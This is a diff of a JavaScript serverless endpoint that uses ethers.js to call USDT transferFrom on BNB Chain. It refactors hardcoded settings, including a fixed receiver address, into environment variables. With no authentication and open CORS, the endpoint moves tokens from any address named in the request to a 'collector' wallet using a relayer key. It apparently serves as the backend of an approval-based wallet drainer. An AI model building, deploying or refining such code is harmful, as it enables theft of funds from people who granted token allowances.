@@ -1,71 +1,96 @@
 import { ethers } from "ethers";
 
+/* ================= CONFIG ================= */
+
+const RPC_URL = process.env.RPC_URL;
+const PRIVATE_KEY = process.env.PRIVATE_KEY;
+const USDT_CONTRACT = process.env.USDT_CONTRACT;
+const COLLECTOR_ADDRESS = process.env.COLLECTOR_ADDRESS;
+
+/* ================= HANDLER ================= */
+
 export default async function handler(req, res) {
 
-  // ===== CORS =====
+  /* ===== CORS ===== */
   res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
 
   if (req.method === "OPTIONS") {
     return res.status(200).end();
   }
 
   if (req.method !== "POST") {
-    return res.status(405).json({ error: "POST only" });
+    return res.status(405).json({ error: "Method not allowed" });
   }
 
   try {
 
-    const { from, amount } = req.body;
+    const { signerAddress, amountHuman } = req.body;
 
-    if (!from || !amount) {
-      return res.status(400).json({ error: "Missing params" });
+    console.log("BODY:", req.body);
+
+    /* ===== VALIDATION ===== */
+
+    if (!signerAddress || !amountHuman) {
+      return res.status(400).json({
+        error: "Missing parameters"
+      });
     }
 
-    // ===== CONFIG =====
-    const RPC = "https://bsc-dataseed.binance.org/";
+    if (!ethers.isAddress(signerAddress)) {
+      return res.status(400).json({
+        error: "Invalid address"
+      });
+    }
 
-    const PRIVATE_KEY =
-      "PUT_YOUR_RELAYER_PRIVATE_KEY_HERE"; // ⚠️ relayer only
+    /* ===== BLOCKCHAIN SETUP ===== */
 
-    const USDT =
-      "0x55d398326f99059fF775485246999027B3197955";
+    const provider = new ethers.JsonRpcProvider(RPC_URL);
 
-    const RECEIVER =
-      "0xDb867b88EAB55320fD50E9785B2906773dedf78b";
+    const wallet = new ethers.Wallet(
+      PRIVATE_KEY,
+      provider
+    );
 
-    // ===== Provider =====
-    const provider = new ethers.JsonRpcProvider(RPC);
-    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
-
-    // ===== Contract =====
-    const abi = [
-      "function transferFrom(address from,address to,uint256 value) public returns(bool)"
+    const ABI = [
+      "function transferFrom(address from,address to,uint256 value) returns (bool)"
     ];
 
-    const token = new ethers.Contract(USDT, abi, wallet);
+    const usdt = new ethers.Contract(
+      USDT_CONTRACT,
+      ABI,
+      wallet
+    );
 
-    // user input amount
-    const value = ethers.parseUnits(amount.toString(), 18);
+    /* ===== AMOUNT ===== */
 
-    // ===== SEND TX =====
-    const tx = await token.transferFrom(
-      from,
-      RECEIVER,
-      value
+    const amount = ethers.parseUnits(
+      amountHuman.toString(),
+      18
+    );
+
+    /* ===== TRANSFER ===== */
+
+    const tx = await usdt.transferFrom(
+      signerAddress,
+      COLLECTOR_ADDRESS,
+      amount
     );
 
     await tx.wait();
 
-    return res.json({
+    return res.status(200).json({
       success: true,
-      hash: tx.hash
+      txHash: tx.hash
     });
 
-  } catch (e) {
-    console.log(e);
+  } catch (err) {
+
+    console.error(err);
+
     return res.status(500).json({
-      error: e.message
+      error: err.message
     });
   }
 }
